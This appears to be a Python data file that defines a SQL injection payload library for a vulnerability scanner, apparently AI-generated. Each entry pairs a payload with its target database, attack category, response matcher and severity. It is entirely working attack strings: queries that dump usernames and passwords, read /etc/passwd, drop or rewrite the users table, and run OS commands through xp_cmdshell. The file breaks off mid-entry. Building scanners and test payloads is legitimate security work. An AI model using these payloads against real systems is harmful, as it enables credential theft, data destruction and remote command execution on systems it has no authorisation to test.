"""sqli payload library — generated dev-time by Claude.

Regenerate via tools/_gen/gen_payloads.py sqli. Zero runtime cost.
"""

SQL_PAYLOADS = [
  {
    "payload": "' AND 1=1--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1=2--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND '1'='1",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND '1'='2",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 AND 1=1",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 AND 1=2",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1=1 AND 'a'='a",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' OR 1=1--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' OR '1'='1'--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|logged in|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "admin'--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|admin|dashboard|logged in)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND SUBSTRING(username,1,1)='a'--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND SUBSTR(username,1,1)='a'--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND ASCII(SUBSTRING(username,1,1))>64--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND LENGTH(password)>5--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM users)>0--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT 1 FROM pg_tables LIMIT 1)=1--",
    "dbms": "PostgreSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT TOP 1 1 FROM sysobjects)=1--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT 1 FROM dual)=1--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT sqlite_version())>0--",
    "dbms": "SQLite",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND 1=(SELECT 1 FROM sqlite_master LIMIT 1)--",
    "dbms": "SQLite",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)=1--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT CASE WHEN 1=2 THEN 1 ELSE 0 END)=1--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND NOT EXISTS(SELECT * FROM users WHERE username='nonexistent_xyz')--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "\" AND \"1\"=\"1",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND ISNULL(1/0,1)=1--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND IF(1=1,1,0)=1--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND IF(1=2,1,0)=1--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(no result|empty|not found|0 row)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND NVL(1,0)=1--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND COALESCE(1,0)=1--",
    "dbms": "PostgreSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM pg_catalog.pg_tables WHERE schemaname='public')>0--",
    "dbms": "PostgreSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM all_tables)>0--",
    "dbms": "Oracle",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
    "dbms": "SQLite",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND CHAR(65)='A'--",
    "dbms": "Generic",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND HEX(1)='31'--",
    "dbms": "MySQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND CONVERT(INT,'1')=1--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND (SELECT 1 WHERE 1=1)=1--",
    "dbms": "MSSQL",
    "category": "boolean",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(xpath syntax error|extractvalue|1105)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(updatexml|xpath|1105|syntax error)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(duplicate entry|1062|floor)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(xpath syntax error|extractvalue|root@)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(xpath syntax error|extractvalue|1105)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)))--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|converting|nvarchar|245)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=CONVERT(int,(SELECT @@version))--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|converting|microsoft sql server)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|converting|nvarchar)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--",
    "dbms": "Oracle",
    "category": "error",
    "matcher": "(?i)(ora-|drithsx|ctxsys)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=CAST((SELECT version()) AS INT)--",
    "dbms": "PostgreSQL",
    "category": "error",
    "matcher": "(?i)(invalid input syntax|cannot cast|postgresql)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=CAST((SELECT current_database()) AS INT)--",
    "dbms": "PostgreSQL",
    "category": "error",
    "matcher": "(?i)(invalid input syntax|cannot cast|error)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT 1,UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual--",
    "dbms": "Oracle",
    "category": "error",
    "matcher": "(?i)(ora-|utl_inaddr|network|host)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(xpath syntax error|extractvalue|1105)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(geometry|illegal|column count|1242)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND POLYGON((SELECT * FROM (SELECT version())a))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(polygon|geometry|illegal|1242)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND exp(~(SELECT * FROM (SELECT version())x))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(double overflow|exp|out of range|1690)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND exp(~(SELECT * FROM (SELECT user())x))--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(double overflow|exp|out of range|1690)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(duplicate entry|1062)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(duplicate entry|1062|5\\.[0-9])",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=1/0--",
    "dbms": "Generic",
    "category": "error",
    "matcher": "(?i)(division by zero|divide|1365|sql)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "'; SELECT 1/0--",
    "dbms": "Generic",
    "category": "error",
    "matcher": "(?i)(division by zero|divide|sql|error)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    "dbms": "MySQL",
    "category": "error",
    "matcher": "(?i)(updatexml|xpath|5\\.[0-9]|8\\.[0-9])",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)=1--",
    "dbms": "Oracle",
    "category": "error",
    "matcher": "(?i)(ora-|xmltype|lax|invalid)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND CAST(1 AS varchar(1))=(SELECT CAST(version() AS varchar(1)))--",
    "dbms": "PostgreSQL",
    "category": "error",
    "matcher": "(?i)(postgresql|invalid input|truncat|error)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=db_name()--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|nvarchar|mssql|sql server)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=@@version--",
    "dbms": "MSSQL",
    "category": "error",
    "matcher": "(?i)(conversion failed|microsoft sql|nvarchar)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND SLEEP({N})--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND SLEEP({N}) AND '1'='1",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "1; SELECT SLEEP({N})--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR SLEEP({N})--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND IF(1=1,SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND IF(1=2,SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME<{N}",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "'; WAITFOR DELAY '0:0:{N}'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "1; WAITFOR DELAY '0:0:{N}'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' IF(1=1) WAITFOR DELAY '0:0:{N}'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:{N}'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=(SELECT 1 FROM PG_SLEEP({N}))--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; SELECT PG_SLEEP({N})--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR 1=1; SELECT PG_SLEEP({N})--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep({N}) ELSE pg_sleep(0) END)--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{N})--",
    "dbms": "Oracle",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; EXEC DBMS_LOCK.SLEEP({N})--",
    "dbms": "Oracle",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{N}))--",
    "dbms": "Oracle",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND RANDOMBLOB(500000000/1)>0--",
    "dbms": "SQLite",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/1))))--",
    "dbms": "SQLite",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND IF(ASCII(SUBSTR(database(),1,1))>64,SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a',SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; SELECT IF(1=1,SLEEP({N}),0)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR IF(1=1,SLEEP({N}),0) OR '1'='2",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; SELECT CASE WHEN 1=1 THEN pg_sleep({N}) ELSE pg_sleep(0) END--",
    "dbms": "PostgreSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT {N} FROM (SELECT SLEEP({N}))a) ELSE 1 END)--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; IF 1=1 WAITFOR DELAY '0:0:{N}'--",
    "dbms": "MSSQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'; SELECT BENCHMARK(50000000,MD5(1))--",
    "dbms": "MySQL",
    "category": "time",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(null|--|error|column|syntax)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,NULL--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(null|--|error|column|syntax)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT NULL,NULL,NULL--",
    "dbms": "Generic",
    "category": "union",
    "matcher": "(?i)(null|--|error|column|syntax)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' UNION SELECT 1,version(),3--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mariadb|mysql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,@@version,3--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(5\\.[0-9]|8\\.[0-9]|mariadb|mysql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(information_schema|users|accounts|admin)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(password|username|email|id|hash)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,username,password FROM users--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(admin|root|user|password|hash|md5)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION ALL SELECT NULL,@@version,NULL--",
    "dbms": "MSSQL",
    "category": "union",
    "matcher": "(?i)(microsoft sql server|sql server [0-9]+)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION ALL SELECT NULL,version(),NULL--",
    "dbms": "PostgreSQL",
    "category": "union",
    "matcher": "(?i)(postgresql [0-9]+|postgres)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,NULL FROM dual--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(oracle|dual|ora-)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT banner,NULL FROM v$version--",
    "dbms": "Oracle",
    "category": "union",
    "matcher": "(?i)(oracle database|oracle [0-9]+)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,sqlite_version(),3--",
    "dbms": "SQLite",
    "category": "union",
    "matcher": "(?i)(3\\.[0-9]+\\.[0-9]+)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--",
    "dbms": "SQLite",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|table)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|orders)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,load_file('/etc/passwd'),3--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(root:|daemon:|nobody:|www-data:)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,user(),database()--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(root@|@localhost|@127)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,current_user,current_database()--",
    "dbms": "PostgreSQL",
    "category": "union",
    "matcher": "(?i)(postgres|admin|root|user)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT name,NULL FROM sysdatabases--",
    "dbms": "MSSQL",
    "category": "union",
    "matcher": "(?i)(master|msdb|tempdb|model)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables--",
    "dbms": "PostgreSQL",
    "category": "union",
    "matcher": "(?i)(users|accounts|admin|public)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users LIMIT 1--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(admin:|root:|user:|[a-f0-9]{32})",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT NULL,@@global.secure_file_priv,NULL--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(\\/|c:\\\\|empty string|null)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,host,user FROM mysql.user--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(root|localhost|%|127\\.0\\.0\\.1)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
    "dbms": "MySQL",
    "category": "union",
    "matcher": "(?i)(information_schema|mysql|performance_schema)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; DROP TABLE users--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(drop|table|error|syntax|query)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(insert|row|affected|error|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE 1=1--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(update|row|affected|error|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC xp_cmdshell('whoami')--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(nt authority|system|administrator|iis)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC master..xp_cmdshell('dir c:\\')--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(volume|directory|bytes|windows)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
    "dbms": "MSSQL",
    "category": "stacked",
    "matcher": "(?i)(configuration|reconfigure|error|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; CREATE TABLE tmpfile(col TEXT)--",
    "dbms": "Generic",
    "category": "stacked",
    "matcher": "(?i)(create|table|error|syntax|sql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; SELECT INTO OUTFILE '/tmp/test.txt'--",
    "dbms": "MySQL",
    "category": "stacked",
    "matcher": "(?i)(outfile|error|permission|syntax)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; COPY (SELECT version()) TO '/tmp/pg_version.txt'--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "(?i)(copy|error|permission|syntax|postgresql)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "'; SELECT pg_read_file('/etc/passwd')--",
    "dbms": "PostgreSQL",
    "category": "stacked",
    "matcher": "(?i)(root:|daemon:|nobody:|www-data:)",
